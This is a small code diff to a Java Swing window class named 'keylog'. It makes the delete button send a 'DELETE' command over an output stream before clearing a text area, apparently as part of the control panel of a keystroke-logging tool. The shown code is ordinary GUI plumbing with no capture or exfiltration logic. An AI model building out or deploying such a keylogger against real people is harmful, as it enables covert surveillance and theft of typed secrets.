@@ -235,7 +235,15 @@ public class keylog extends javax.swing.JFrame {
 
     private void deleteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_deleteActionPerformed
 
-        jTextArea1.setText("");
+        String s = "DELETE";
+        try {
+            program.os.write(s);
+            program.os.newLine();
+            program.os.flush();
+            jTextArea1.setText("");
+        } catch (IOException ex) {
+            Logger.getLogger(keylog.class.getName()).log(Level.SEVERE, null, ex);
+        }
     }//GEN-LAST:event_deleteActionPerformed
 
     private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
